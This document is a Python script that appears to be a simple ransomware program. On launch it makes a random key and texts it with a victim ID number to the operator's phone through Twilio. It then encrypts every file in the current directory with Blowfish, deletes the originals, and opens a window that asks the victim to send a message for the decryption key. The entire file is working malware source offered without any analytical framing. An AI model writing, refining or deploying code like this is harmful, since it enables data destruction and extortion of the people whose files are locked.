import random
import string
from twilio.rest import Client
import tkinter as tk
from tkinter import messagebox
from Crypto.Cipher import Blowfish
import os

# generate a random encryption key
key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))

# generate a random id number
id_number = str(random.randint(0, 999)).zfill(3)

# send key and id number through Twilio SMS
account_sid = 'ENTER ACCOUNT SID HERE'
auth_token = 'ENTER AUTH TOKEN HERE'
client = Client(account_sid, auth_token)
message = client.messages.create(
    body=f'Encryption key: {key}\nID number: {id_number}',
    from_='TWILIO PHONE NUMBER HERE',
    to='YOUR PHONE NUMBER HERE'
)

# declare key_entry as a global variable
global key_entry

# function to encrypt files
def encrypt_files(key):
    cipher = Blowfish.new(key)
    files = os.listdir('.')
    for file in files:
        if not file.endswith('.enc'):
            with open(file, 'rb') as f_in, open(file + '.enc', 'wb') as f_out:
                encrypted_data = cipher.encrypt(f_in.read())
                f_out.write(encrypted_data)
            os.remove(file)

# function to decrypt files
def decrypt_files(key):
    cipher = Blowfish.new(key)
    files = os.listdir('.')
    for file in files:
        if file.endswith('.enc'):
            with open(file, 'rb') as f_in, open(file[:-4], 'wb') as f_out:
                decrypted_data = cipher.decrypt(f_in.read())
                f_out.write(decrypted_data)
            os.remove(file)
    messagebox.showinfo("Success", "Files decrypted successfully.")

# function to verify decryption key
def verify_key():
    input_key = key_entry.get()
    if input_key == key:
        decrypt_files(key)
    else:
        messagebox.showerror("Error", "Invalid decryption key. Please try again.")

# function to display GUI
def display_gui():
    global key_entry
    root = tk.Tk()
    root.geometry('300x150')
    root.title('Encryption Tool')

    # sms label
    sms_label = tk.Label(root, text="EXAMPLE: SMS YOUREMAIL@.com for decryption key")
    sms_label.pack(pady=5)

    # key label and entry
    key_label = tk.Label(root, text="Enter decryption key:")
    key_label.pack()
    key_entry = tk.Entry(root, show="*")
    key_entry.pack(pady=5)

    # verify button
    verify_button = tk.Button(root, text="Verify", command=verify_key)
    verify_button.pack()

    # id number label
    id_number_label = tk.Label(root, text=f'ID Number: {id_number}')
    id_number_label.pack(side=tk.BOTTOM)

    root.mainloop()

# encrypt files
encrypt_files(key)

# start GUI
display_gui()
